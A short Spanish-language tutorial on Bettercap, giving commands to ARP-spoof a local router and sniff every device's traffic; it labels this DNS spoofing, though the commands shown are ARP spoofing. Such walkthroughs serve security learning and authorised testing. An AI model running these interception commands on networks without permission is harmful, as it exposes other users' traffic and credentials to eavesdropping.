---
title: "Análisis con Bettercap"
description: "Bettercap es una herramienta avanzada de seguridad y pruebas de penetración que se utiliza principalmente para realizar ataques en redes, análisis de tráfico, y manipulación de datos en tiempo real."
category: "Redes"
image: "https://raw.githubusercontent.com/bettercap/media/master/ui-events.png"
---


## ¿Qué es y para qué sirve Bettercap?

Bettercap es una herramienta avanzada de seguridad y pruebas de penetración que se utiliza principalmente para realizar ataques en redes, análisis de tráfico, y manipulación de datos en tiempo real. Es una herramienta versátil diseñada para realizar tareas de man-in-the-middle (MitM), es decir, interceptar, modificar, y redirigir tráfico en una red.

## Instalación

```bash
sudo apt-get install bettercap
```

## Uso

Para hacer un ataque MITM tendremos que hacer un ataque **DNS Spoofing** a nuestra máquina windows.

Ahora usaremos con siguiente comandos:

![DNS Spoofing](https://flashstart.com/wp-content/uploads/2023/03/DNS-spoofing-768x435-1.jpg)

```bash
bettercap

net.probe on

ticker on
```

Como podemos observar son las IP de nuestra red local.

![IPs Red Local](https://github.com/bl4ck44/Conocimiento/blob/master/An%C3%A1lisis%20de%20Red%20y%20Seguridad%20Wireless/Bettercap/Img/IP.jpg?raw=true)

En la misma terminal ejecutaremos de nuevo bettercap, seleccionamos la IP que vamos analizar en este caso vamos a analizar todas las IP para esto seleccionamos la IP del router.

```bash
set arp.spoof.targets 192.168.1.1

arp.spoof on

set net.sniff.verbose false

net.sniff on
```

Y nos mostrará todo el tráfico de todos los dispositivos.